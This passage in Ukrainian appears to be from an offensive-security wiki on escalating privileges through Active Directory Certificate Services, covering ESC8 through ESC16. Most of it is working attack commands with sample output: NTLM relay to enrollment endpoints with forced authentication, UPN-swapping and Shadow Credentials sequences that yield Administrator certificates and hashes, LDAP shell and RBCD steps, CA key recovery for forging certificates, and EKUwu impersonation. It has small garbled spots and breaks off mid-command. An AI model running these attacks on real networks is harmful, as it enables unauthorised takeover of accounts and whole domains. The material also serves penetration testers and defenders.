- **Інтерфейс вебреєстрації** (старіший ASP-застосунок за адресою `http://<caserver>/certsrv/`) за замовчуванням використовує лише HTTP, який не захищає від атак NTLM relay. Крім того, він явно дозволяє лише автентифікацію NTLM через HTTP-заголовок Authorization, тому безпечніші методи автентифікації, як-от Kerberos, тут непридатні.
- **Служба реєстрації сертифікатів** (CES), вебслужба **політики реєстрації сертифікатів** (CEP) і **служба реєстрації мережевих пристроїв** (NDES) за замовчуванням підтримують автентифікацію negotiate через HTTP-заголовок Authorization. Автентифікація negotiate **підтримує і** Kerberos, і **NTLM**, що дає зловмиснику змогу **понизити рівень автентифікації до NTLM** під час атак relay. Хоча ці вебслужби за замовчуванням використовують HTTPS, сам HTTPS **не захищає від атак NTLM relay**. Захистити служби HTTPS від атак NTLM relay можна лише в поєднанні HTTPS із прив’язуванням каналу. На жаль, AD CS не активує Extended Protection for Authentication в IIS, необхідний для прив’язування каналу.<sup>[[6]](#references)</sup>

Поширена **проблема** атак NTLM relay — **короткий час життя сеансів NTLM** і неможливість взаємодії з сервісами, які **вимагають підписування NTLM**.

Однак це обмеження можна подолати, скориставшись атакою NTLM relay для отримання сертифіката користувача: тривалість сеансу визначатиметься строком дії сертифіката, а сам сертифікат можна використовувати з сервісами, які **вимагають підписування NTLM**. Інструкції з використання викраденого сертифіката наведено тут:


{{#ref}}
account-persistence.md
{{#endref}}

Ще одне обмеження атак NTLM relay полягає в тому, що **обліковий запис жертви має автентифікуватися на машині, контрольованій зловмисником**. Зловмисник може почекати або спробувати **примусово викликати** цю автентифікацію:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Експлуатація**

Команда `cas` у [**Certify**](https://github.com/GhostPack/Certify) перелічує **активовані HTTP-кінцеві точки AD CS**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CA) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна розібрати та вивести списком за допомогою інструмента **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

За замовчуванням Certipy надсилає запит на сертифікат на основі шаблону `Machine` або `User` — залежно від того, чи закінчується ім’я облікового запису, автентифікацію якого ретранслюють, символом `$`. Щоб указати інший шаблон, можна скористатися параметром `-template`.

Потім для примусової автентифікації можна застосувати техніку на кшталт [PetitPotam](https://github.com/ly4k/PetitPotam). Якщо йдеться про контролери домену, потрібно вказати `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, вилучає розширення SID `szOID_NTDS_CA_SECURITY_EXT` із сертифіката. Старі приклади ESC9 залежать від поведінки сумісності KDC (`StrongCertificateBindingEnforcement=1`) або окремого маршруту слабкого зіставлення Schannel. Значення `1` — це **історичне налаштування сумісності**, а не поточне значення за замовчуванням: Microsoft повідомляє, що перевизначення KDC більше не підтримується після оновлення безпеки Windows від 9 вересня 2025 року. Перш ніж застосовувати старий рецепт, перевірте фактичне оновлення цільової системи та кінцеву точку автентифікації.<sup>[[7]](#references)</sup> Див. [рекомендації Microsoft щодо розгортання](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Умови, за яких налаштування цього прапорця набуває значення:

- На старішому сумісному KDC ефективна політика прив’язування сертифікатів дозволяє зіставлення; або ж кінцева точка Schannel окремо вмикає зіставлення UPN за допомогою біта `0x4` параметра `CertificateMappingMethods`.
- У параметрі `msPKI-Enrollment-Flag` для сертифіката встановлено прапорець `CT_FLAG_NO_SECURITY_EXTENSION`.
- У сертифікаті вказано будь-який EKU для автентифікації клієнта.
- Доступні дозволи `GenericWrite` для будь-якого облікового запису, щоб скомпрометувати інший.

### Сценарій зловживання

Припустімо, `John@corp.local` має дозволи `GenericWrite` для `Jane@corp.local` і прагне скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, на отримання якого має право `Jane@corp.local`, налаштовано з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримують за допомогою Shadow Credentials завдяки дозволу `GenericWrite`, який має `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Згодом `userPrincipalName` `Jane` змінюється на `Administrator`, навмисно опускаючи частину домену `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається відмінним від `userPrincipalName` користувача `Administrator`.

Після цього вразливий шаблон сертифіката `ESC9` запитується від імені `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Зазначено, що `userPrincipalName` сертифіката відповідає `Administrator` і не містить жодного «object SID».

Після цього `userPrincipalName` `Jane` повертають до початкового значення — `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Спроба автентифікації за допомогою виданого сертифіката тепер повертає NT hash `Administrator@corp.local`. Через відсутність у сертифікаті вказаного домену команда має містити `-domain <domain>`:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Слабкі зіставлення сертифікатів — ESC10

### Пояснення

У контексті ESC10 часто обговорюють дві окремі політики зіставлення сертифікатів. Перевіряйте параметр на кінцевій точці, яка фактично обробляє відповідну автентифікацію:

- `CertificateMappingMethods` Schannel у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` керує зіставленням клієнтських сертифікатів TLS на сервері застосунку. Біт UPN — `0x4`; на оновлених системах значення за замовчуванням — `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` KDC у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` історично керував сумісністю прив’язування сертифікатів Kerberos. Значення `1` не є надійним поточним значенням за замовчуванням, а Microsoft припинила підтримку цього перевизначення з оновленням безпеки Windows від 9 вересня 2025 року. Сам по собі його стан не описує зіставлення UPN у Schannel.<sup>[[7]](#references)</sup>

**Випадок 1**

Історично, якщо старіший KDC враховував `StrongCertificateBindingEnforcement=0`; перевірте рівень оновлень, оскільки це перевизначення більше не підтримується на актуальних системах із виправленнями.

**Випадок 2**

Якщо на кінцевій точці клієнтських сертифікатів Schannel увімкнено біт UPN (`0x4`) параметра `CertificateMappingMethods`. Це окремий параметр, не пов’язаний із примусовим посиленням прив’язування KDC, і для нього все ще потрібен сертифікат автентифікації клієнта, на який можна отримати сертифікат, а також ефективний контроль над атрибутом зіставленого облікового запису.

### Зловживання — випадок 1

У старому розгортанні, де KDC усе ще враховує `StrongCertificateBindingEnforcement=0`, контроль над `userPrincipalName` облікового запису може бути частиною шляху слабкого зіставлення з іншим обліковим записом. Необхідно окремо перевірити можливість отримання сертифіката, зіставлення, цільову ідентичність і успішну автентифікацію; самих ACE `GenericWrite` або значення в реєстрі недостатньо, щоб стверджувати про захоплення облікового запису.

Наприклад, маючи дозволи `GenericWrite` для `Jane@corp.local`, зловмисник прагне скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9 і дає змогу використовувати будь-який шаблон сертифіката.

Спочатку хеш `Jane` отримують за допомогою Shadow Credentials, використовуючи `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Згодом `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно без частини `@corp.local`, щоб уникнути порушення обмеження.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Після цього від імені `Jane` запитується сертифікат із підтримкою автентифікації клієнта, використовуючи шаблон `User` за замовчуванням.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` користувачки `Jane` потім повертається до початкового значення `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Автентифікація за допомогою отриманого сертифіката дасть NT-хеш `Administrator@corp.local`, тому в команді потрібно вказати домен, оскільки сертифікат не містить відомостей про домен.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Сценарій зловживання 2

Якщо `CertificateMappingMethods` містить бітовий прапорець `UPN` (`0x4`), обліковий запис A із дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, у якого немає властивості `userPrincipalName`, зокрема облікові записи комп’ютерів і вбудований адміністратор домену `Administrator`.

У цьому випадку мета — скомпрометувати `DC$@corp.local`, спершу отримавши хеш `Jane` за допомогою Shadow Credentials і скориставшись `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` для `Jane` потім встановлюється як `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Сертифікат для автентифікації клієнта запитується від імені `Jane` за допомогою шаблону `User` за замовчуванням.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` користувача `Jane` після цього процесу повертається до початкового значення.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Для автентифікації через Schannel використовується опція Certipy `-ldap-shell`, що вказує на успішну автентифікацію як `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Через LDAP shell такі команди, як `set_rbcd`, дають змогу здійснювати атаки з Resource-Based Constrained Delegation (RBCD), що потенційно може призвести до компрометації контролера домену.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ця вразливість також стосується будь-якого облікового запису користувача, якому не призначено `userPrincipalName`, або якщо він не збігається з `sAMAccountName`. Обліковий запис `Administrator@corp.local` є особливо привабливою ціллю через підвищені привілеї LDAP і відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо CA Server не налаштовано з `IF_ENFORCEENCRYPTICERTREQUEST`, можна виконувати NTLM relay attacks без підписування через службу RPC. [Посилання тут](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Можна використовувати `certipy`, щоб перевірити, чи вимкнено `Enforce Encryption for Requests`. `certipy` покаже вразливості `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Сценарій зловживання

Для цього потрібно налаштувати relay-сервер:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Примітка: Для контролерів домену потрібно вказати `-template` у DomainController.

Або скористатися [форком impacket від sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Доступ до shell ADCS CA з YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Certificate Authority для зберігання на зовнішньому пристрої, наприклад «Yubico YubiHSM2».

Якщо USB-пристрій підключено до сервера CA через USB-порт або USB-сервер пристроїв у випадку, коли сервер CA є віртуальною машиною, для Key Storage Provider потрібен ключ автентифікації (іноді його називають «паролем»), щоб створювати ключі в YubiHSM і використовувати їх.

Цей ключ/пароль зберігається у реєстрі у відкритому вигляді за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Посилання [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Сценарій зловживання

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, після отримання доступу до shell можна відновити ключ.

Спершу потрібно отримати сертифікат CA (він є публічним), а потім:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Finally, використайте команду certutil `-sign`, щоб підробити новий довільний сертифікат за допомогою сертифіката CA та його приватного ключа.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дає змогу додати політику видачі до шаблону сертифіката. Об’єкти `msPKI-Enterprise-Oid`, відповідальні за видачу політик, можна знайти в контексті іменування Configuration (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов’язати з групою AD за допомогою атрибута `msDS-OIDToGroupLink` цього об’єкта, завдяки чому система авторизуватиме користувача, який пред’являє сертифікат, так, ніби він є членом цієї групи. [Посилання тут](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Іншими словами, якщо користувач має дозвіл на реєстрацію сертифіката, а сертифікат пов’язаний із групою OID, користувач може успадкувати привілеї цієї групи.

Використайте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Сценарій зловживання

Знайдіть дозвіл користувача, яким можна скористатися за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на реєстрацію в `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Для цього потрібно лише вказати шаблон — користувач отримає сертифікат із правами OIDToGroupLink.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Зловживання явним зіставленням сертифікатів — ESC14

### Пояснення

Опис за адресою https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping надзвичайно докладний. Нижче наведено цитату з оригінального тексту.<sup>[[14]](#references)</sup>

ESC14 стосується вразливостей, що виникають через «слабке явне зіставлення сертифікатів», насамперед унаслідок неправильного використання або небезпечного налаштування атрибута `altSecurityIdentities` в облікових записах користувачів або комп’ютерів Active Directory. Цей багатозначний атрибут дає адміністраторам змогу вручну зіставляти сертифікати X.509 з обліковим записом AD для автентифікації. Якщо такі явні зіставлення задано, вони можуть замінити стандартну логіку зіставлення сертифікатів, яка зазвичай спирається на UPN або DNS-імена в SAN сертифіката чи на SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

«Слабке» зіставлення виникає, коли рядкове значення в атрибуті `altSecurityIdentities`, яке ідентифікує сертифікат, надто широке, його легко вгадати, воно залежить від неунікальних полів сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо зловмисник може отримати або створити сертифікат з атрибутами, що відповідають такому слабко визначеному явному зіставленню для привілейованого облікового запису, він може автентифікуватися за допомогою цього сертифіката та видати себе за цей обліковий запис.

Приклади потенційно слабких рядків зіставлення `altSecurityIdentities`:

- Зіставлення лише за поширеним загальним іменем (CN) суб’єкта: наприклад, `X509:<S>CN=SomeUser`. Зловмисник може отримати сертифікат із таким CN з менш захищеного джерела.
- Використання надто загальних розрізнювальних імен видавця (DN) або DN суб’єкта без додаткових уточнень, як-от конкретного серійного номера чи ідентифікатора ключа суб’єкта: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або некриптографічних ідентифікаторів, яким зловмисник може задовольнити в сертифікаті, який він може легально отримати або підробити (якщо він скомпрометував CA або знайшов вразливий шаблон, як-от в ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати зіставлення, зокрема:

- `X509:<I>IssuerDN<S>SubjectDN` (зіставлення за повними DN видавця та суб’єкта)
- `X509:<SKI>SubjectKeyIdentifier` (зіставлення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (зіставлення за серійним номером, неявно уточненим DN видавця) — це нестандартний формат; зазвичай використовують `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (зіставлення за іменем RFC822, зазвичай адресою електронної пошти, із SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (зіставлення за SHA1-хешем необробленого відкритого ключа сертифіката — зазвичай надійний варіант)

Безпека цих зіставлень залежить від ідентифікаторів, використаних у зіставленні. Microsoft класифікує зіставлення на основі адрес електронної пошти або імен суб’єктів, зокрема `X509:<RFC822>`, як **слабкі**. У режимі Full Enforcement сертифікат без надійного зіставлення відхиляється; оновлення безпеки Windows за вересень 2025 року прибрало можливість повернутися до режиму Compatibility. Тому саме слабке зіставлення не є надійним актуальним способом видати себе за інший обліковий запис. Перш ніж оцінювати сценарій зі слабким зіставленням, перевірте фактичний рівень оновлень контролера домену та його поведінку зіставлення сертифікатів. Доступ на запис до `altSecurityIdentities` — це окремий напрямок для перевірки: зловмисник із відповідним довіреним сертифікатом може мати змогу додати **надійне** явне зіставлення з урахуванням ефективних дозволів і перевірки сертифіката. Див. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) і [дослідження ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Також потрібно з’ясувати причини збоїв автентифікації за допомогою сертифіката: вимкнений цільовий обліковий запис або прострочений пароль можуть перешкодити входу, навіть якщо сам сертифікат залишається чинним.

### Сценарій зловживання

ESC14 націлений на **явні зіставлення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут задано (навмисно або через неправильне налаштування), зловмисники можуть видавати себе за облікові записи, надаючи сертифікати, що відповідають зіставленню.

#### Сценарій A: зловмисник може записувати в `altSecurityIdentities`

 **Передумова**: зловмисник має дозвіл на запис до атрибута `altSecurityIdentities` цільового облікового запису або може надати такий дозвіл одним із наведених нижче способів для цільового об’єкта AD:  
- Властивість запису `altSecurityIdentities`  
- Властивість запису `Public-Information`  
- Властивість запису (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Власник*.
#### Сценарій B: ціль має слабке зіставлення через X509RFC822 (Email)

- **Історична/умовна передумова**: ціль має слабке зіставлення X509RFC822 в `altSecurityIdentities`, зловмисник може редагувати атрибут `mail` користувача, який запитує сертифікат, а відповідний шаблон додає цю адресу електронної пошти до сертифіката автентифікації клієнта без конфліктного прив’язування SID. Для автентифікації також потрібне середовище, яке досі приймає слабке зіставлення; Full Enforcement відхиляє сертифікати, зіставлені лише за слабким правилом. Сам по собі доступ на запис до атрибута `mail` — лише напрямок для перевірки.
#### Сценарій C: ціль має зіставлення X509IssuerSubject

- **Передумова**: ціль має слабке явне зіставлення X509IssuerSubject в `altSecurityIdentities`. Зловмисник може задати атрибут `cn` або `dNSHostName` для принципала-жертви так, щоб він відповідав суб’єкту зіставлення X509IssuerSubject цілі. Потім зловмисник може запросити сертифікат від імені жертви та використати його для автентифікації як ціль.
#### Сценарій D: ціль має зіставлення X509SubjectOnly

- **Передумова**: ціль має слабке явне зіставлення X509SubjectOnly в `altSecurityIdentities`. Зловмисник може задати атрибут `cn` або `dNSHostName` для принципала-жертви так, щоб він відповідав суб’єкту зіставлення X509SubjectOnly цілі. Потім зловмисник може запросити сертифікат від імені жертви та використати його для автентифікації як ціль.
### конкретні дії
#### Сценарій A

Запросіть сертифікат за шаблоном сертифіката `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Збереження та конвертація сертифіката

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Автентифікуйтеся (за допомогою сертифіката)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Очищення (необов’язково)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Для конкретніших методів атак у різних сценаріях дивіться: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

[Оригінальне дослідження ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) пояснює, як політики застосунків, указані в запиті для шаблону V1, можуть перевизначити налаштоване Extended Key Usage на **неоновленому CA видачі сертифікатів**.<sup>[[15]](#references)</sup> Потенційний шаблон також має бути опублікованим, доступним для реєстрації та дозволяти потрібні властивості subject/request, не маючи блокувальних вимог щодо схвалення чи підпису. Самі лише права на реєстрацію не доводять можливість експлуатації. Використання Certificate Request Agent додатково може залежати від наявності відповідного другого шаблону та обмежень для агентів реєстрації; перш ніж стверджувати, що цей шлях працює, перевірте стан виправлень CA та результат видачі сертифіката.

### Зловживання

[Документація Certipy з підвищення привілеїв](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) містить докладніші приклади використання.<sup>[[14]](#references)</sup>


Команда `find` у Certipy може допомогти виявити шаблони V1, потенційно вразливі до ESC15, якщо CA не має потрібних виправлень.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Сценарій A: Пряме видання себе за іншу особу через Schannel

**Крок 1: Запросіть сертифікат, додавши політику застосунку "Client Authentication" і цільовий UPN.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон V1 "WebServer" (який дозволяє задавати subject під час реєстрації).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Вразливий шаблон V1 із параметром «Enrollee supplies subject».
- `-application-policies 'Client Authentication'`: Додає OID `1.3.6.1.5.5.7.3.2` до розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Задає UPN у SAN для імперсонації.

**Крок 2: Автентифікуйтеся через Schannel (LDAPS), використовуючи отриманий сертифікат.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: Імперсонація PKINIT/Kerberos через зловживання Enrollment Agent

**Крок 1: Запросіть сертифікат із шаблону V1 (з параметром "Enrollee supplies subject"), додавши політику застосунку "Certificate Request Agent".** Цей сертифікат призначений для зловмисника (`attacker@corp.local`), щоб він став агентом реєстрації. Для власної ідентичності зловмисника тут не вказується UPN, оскільки мета — отримати можливості агента.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте сертифікат «agent», щоб запросити сертифікат від імені привілейованого користувача-цілі.** Це крок, подібний до ESC3, у якому використовується сертифікат із Кроку 1 як сертифікат агента.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Крок 3: Автентифікуйтеся як привілейований користувач за допомогою сертифіката "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Розширення безпеки вимкнено на CA (глобально)-ESC16

### Пояснення

**ESC16 (підвищення привілеїв через відсутність розширення szOID_NTDS_CA_SECURITY_EXT)** описує глобальне для CA вимкнення розширення SID **szOID_NTDS_CA_SECURITY_EXT**. Це індикатор конфігурації, а не доказ того, що сертифікат може пройти автентифікацію від імені іншого облікового запису. Для імперсонації також потрібен контроль над відповідними атрибутами облікового запису або зіставленням, шаблон із можливістю реєстрації для автентифікації клієнта та шлях зіставлення сертифіката, який приймає фактичний контролер домену або служба. KDC із виправленнями в режимі Full Enforcement відхиляє сертифікати без розширення SID, якщо вони не мають іншого сильного зіставлення; наведена нижче процедура Kerberos лише з UPN призначена для старіших KDC або KDC у режимі сумісності, які все ще приймають слабке зіставлення. Див. [рекомендації Microsoft щодо зіставлення сертифікатів і примусового застосування](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Також можна звернутися до цієї статті, щоб дізнатися більше про докладний принцип:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Експлуатація

Наведений нижче історичний приклад Kerberos лише з UPN заснований на [документації Certipy щодо ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Для нього потрібен KDC, який усе ще приймає отримане слабке зіставлення; `StrongCertificateBindingEnforcement=1` більше не є підтримуваним перевизначенням після оновлення безпеки Windows від 9 вересня 2025 року.<sup>[[14]](#references)</sup>

Щоб визначити, чи є середовище Active Directory Certificate Services (AD CS) вразливим до **ESC16**】【。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Крок 1: Зчитайте початковий UPN облікового запису жертви (необов’язково — для відновлення).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Крок 2: Оновіть UPN облікового запису жертви, задавши йому `sAMAccountName` цільового адміністратора.**  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Крок 3: (За потреби) Отримайте облікові дані для облікового запису «жертви» (наприклад, через Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
